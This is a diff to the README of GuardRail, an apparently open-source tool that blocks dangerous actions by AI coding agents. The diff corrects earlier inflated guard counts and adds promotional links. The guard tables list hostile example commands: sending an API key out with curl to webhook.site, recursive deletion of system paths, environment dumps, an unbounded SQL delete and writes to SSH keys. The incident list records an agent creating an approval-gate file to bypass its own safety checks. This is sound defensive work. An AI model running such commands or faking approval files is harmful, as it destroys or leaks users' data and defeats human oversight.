@@ -11,7 +11,7 @@
 
 <p align="center">
   <a href="#quick-start">Quick Start</a> · 
-  <a href="#18-core-guards">18 Guards</a> · 
+  <a href="#13-core-guards">13 Guards</a> · 
   <a href="#how-it-compares">Comparison</a> · 
   <a href="#architecture">Architecture</a> · 
   <a href="#guardrail-pro">Pro</a> · 
@@ -22,9 +22,11 @@
 
 ### Last Tuesday, 2:47 AM.
 
-My AI agent tried to mass-delete a production database. **172 guards said no.**
+My AI agent tried to mass-delete a production database. **One guard said no.**
 
 The agent was debugging a slow query. It found the table, decided the data was stale, and ran `DELETE FROM profiles`. No WHERE clause. 23 databases, every single customer record. Gone in one command.
+
+`mass_update_guard` stopped it. That guard is one of the 13 you get for free below.
 
 Except it wasn't gone. GuardRail blocked the command before it executed. The agent got a clear error, adjusted its approach, and fixed the actual performance issue instead.
 
@@ -38,7 +40,7 @@ That's the difference between validating what an LLM *says* and blocking what an
   │    DELETE without WHERE clause on protected table: profiles   │
   │    Command was NOT executed.                                  │
   │                                                              │
-  │  172 guards active · 96% enforcement rate · <1ms per guard   │
+  │  13 core guards active · fail-closed · no LLM in the path    │
   └──────────────────────────────────────────────────────────────┘
 ```
 
@@ -50,14 +52,14 @@ That's the difference between validating what an LLM *says* and blocking what an
 
 <table>
   <tr>
-    <td align="center"><strong>172</strong><br><sub>Active Guards</sub></td>
-    <td align="center"><strong>96%</strong><br><sub>Enforcement Rate</sub></td>
-    <td align="center"><strong>1,048</strong><br><sub>Autonomous Tasks Completed</sub></td>
-    <td align="center"><strong>81</strong><br><sub>Containers Protected</sub></td>
+    <td align="center"><strong>13</strong><br><sub>Free Guards</sub></td>
+    <td align="center"><strong>48</strong><br><sub>Pro Guards</sub></td>
+    <td align="center"><strong>61</strong><br><sub>Guards Total</sub></td>
+    <td align="center"><strong>50+</strong><br><sub>Attack Patterns Tested</sub></td>
   </tr>
 </table>
 
-<p align="center"><sub>Numbers from a live production system running 13 applications on a single server. Not a demo.</sub></p>
+<p align="center"><sub>What you actually install. Run <code>guardrail status</code> after install and these are the numbers you see.</sub></p>
 
 ---
 
@@ -106,16 +108,16 @@ Real incidents from our production system that GuardRail stopped:
 - Agent tried to `touch /tmp/approval-gate` to bypass its own safety checks.
 - 47 consecutive failed curl attempts (wrong port) before the wandering detector intervened.
 
-## 18 Core Guards
+## 13 Core Guards
 
-All free. All MIT-licensed. All battle-tested.
+All free. All MIT-licensed. Every guard in these tables is installed by
+`npx guardrail-agent init` and runs on every matching tool call.
 
-### Pre-execution guards (block before the command runs)
+### Pre-execution, shell commands (block before the command runs)
 
 | Guard | What it stops | Example |
 |---|---|---|
 | `main_push_guard` | Direct push to protected branches, force push, `reset --hard` | `git push origin main` |
-| `force_push_guard` | Force push to any branch (`--force`, `--force-with-lease`, `-f`) | `git push --force origin feat` |
 | `basic_pii_gate` | Commands that dump environment variables and secrets | `env`, `printenv`, `docker inspect` |
 | `basic_secret_detector` | Exfiltration of secrets via curl, wget, or base64 | `curl webhook.site -d "$API_KEY"` |
 | `destructive_path_guard` | Recursive deletion on protected system paths | `rm -rf /home/`, `rm -rf /etc/` |
@@ -123,21 +125,28 @@ All free. All MIT-licensed. All battle-tested.
 | `service_protection_guard` | Stopping critical services (docker, sshd, postgres, nginx) | `systemctl stop docker` |
 | `mass_update_guard` | SQL UPDATE/DELETE without WHERE clause on protected tables | `DELETE FROM profiles` |
 | `self_bypass_guard` | Agent creating its own approval/gate files | `touch /tmp/guardrail-gate-approve` |
-| `deploy_branch_guard` | Deploying from non-approved branches | Deploy from `feat/wip` instead of `main` |
-| `large_diff_guard` | Commits with unusually large diffs (generated files, node_modules) | 2000-line commit with package-lock |
-| `tool_call_budget_guard` | Runaway agents burning through context window and API credits | 50+ tool calls in one session |
-| `context_window_guard` | Commands that produce excessive output (unbounded logs, cat) | `cat huge-file.log`, `docker logs` |
 
-### Post-execution guards (scan output after the command runs)
+### Pre-execution, file writes (block before Write / Edit / MultiEdit)
+
+| Guard | What it stops | Example |
+|---|---|---|
+| `edit_path_guard` | File-tool writes to GuardRail's own guards, the hook registry, and persistence paths | `Write` to `.claude/settings.json` or `~/.ssh/authorized_keys` |
+| `edit_secret_guard` | Writing live credentials into files through file tools | `Write` a file containing an AWS or Stripe key |
+
+### Post-execution (scan output after the command runs)
 
 | Guard | What it detects | Example |
 |---|---|---|
 | `env_dump_detector` | Environment variable dumps in output (even from obfuscated commands) | 10+ KEY=VALUE lines in output |
 | `basic_injection_scanner` | Prompt injection attempts in command output | Malicious instruction patterns |
 | `error_swallow_guard` | Empty catch blocks in payment/webhook/cron code | `catch (e) { console.log(e) }` |
-| `credential_leak_guard` | API keys, tokens, private keys in command output | AWS keys, Stripe keys, JWTs, SSH keys |
-| `wandering_detector` | Trial-and-error loops (3+ consecutive failures) | Wrong port, wrong port, wrong port |
-| `self_correction_loop` | Build/test failures that the agent tries to ignore | `Build failed` followed by "done" |
+
+The repository carries nine further guards under `guards/core/`
+(`force_push_guard`, `deploy_branch_guard`, `large_diff_guard`,
+`credential_leak_guard`, `wandering_detector`, `self_correction_loop`,
+`tool_call_budget_guard`, `context_window_guard`, `uncommitted_code_guard`).
+They have tests, but no dispatcher loads them yet, so they do not run after an
+install and are not counted above.
 
 ## How It Compares
 
@@ -254,12 +263,14 @@ See [docs/writing-guards.md](docs/writing-guards.md) for the full guide.
 ```bash
 $ guardrail status
 
-  GuardRail v0.3.0
+  GuardRail v0.4.6
 
-  18 core guards active
-  2 pro guards
+  13 core guards active
+  Enforcement verified (registered hook and deny probe)
+  0 pro guards
 
-  Audit: 142 blocked / 1,847 total (7.7% block rate)
+  Unlock 48 Pro guards free for 14 days:
+  guardrail upgrade --trial
 
 $ guardrail pentest
 
@@ -295,13 +306,13 @@ Plus: Penetration test framework (50+ attack patterns), priority support, compli
       <strong>Pro</strong><br>
       EUR 29/dev/month<br>
       <sub>Managed rules, compliance dashboard, priority support</sub><br>
-      <a href="https://guardrail.promptandbuild.de">Get started</a>
+      <a href="https://guardrail.promptandbuild.de?utm_source=github&utm_medium=readme&utm_campaign=guardrail">Get started</a>
     </td>
     <td align="center">
       <strong>Enterprise</strong><br>
       EUR 49/dev/month<br>
       <sub>Custom guards, SLA, dedicated onboarding, audit trail export</sub><br>
-      <a href="https://guardrail.promptandbuild.de">Contact us</a>
+      <a href="https://guardrail.promptandbuild.de?utm_source=github&utm_medium=readme&utm_campaign=guardrail">Contact us</a>
     </td>
   </tr>
 </table>
@@ -336,9 +347,13 @@ See [SECURITY.md](SECURITY.md) for vulnerability reporting.
 
 ## Battle-Tested
 
-GuardRail patterns are extracted from a production system running **172 guards across 13 applications since 2025**. The public guards are the universal subset. They work for any codebase, any team, any agent.
+GuardRail's patterns are extracted from a private production system that has
+run AI coding agents across 13 applications since 2025. That system carries
+far more guards than this package, most of them tied to its own stack. The 13
+core guards here are the universal subset: they work for any codebase, any
+team, any agent.
 
-Every guard in this repository has prevented a real incident.
+Each of them was written in response to something an agent actually did.
 
 > *"We wanted a community app for our members. Frederik showed us what's possible with AI, and then he just built it. No endless concept phases, just results."*
 > 
@@ -367,7 +382,9 @@ GuardRail is one of five open-source tools that form a complete AI governance st
 
 Each tool works standalone. Together, they run a production system with 81 containers, 225 cron jobs, and zero dedicated ops staff.
 
-**Learn the principles behind this stack:** [18 free lessons on KI-Governance](https://lernen.promptandbuild.de)
+**Learn the principles behind this stack:** [18 free lessons on KI-Governance](https://lernen.promptandbuild.de?utm_source=github&utm_medium=readme&utm_campaign=guardrail)
+
+**The full methodology in book form:** [Running Without Me](https://promptandbuild.de/book?utm_source=github&utm_medium=readme&utm_campaign=guardrail). How a solo founder runs 13 applications with AI agents and zero ops staff.
 
 ## Contributing
 
@@ -381,7 +398,7 @@ MIT. See [LICENSE](LICENSE).
 
 <p align="center">
   Built by <a href="https://promptandbuild.de">Prompt & Build</a>.<br>
-  Patterns extracted from a production system running 172 guards across 13 applications.
+  Patterns extracted from a production system running AI agents across 13 applications.
 </p>
 
 <p align="center">
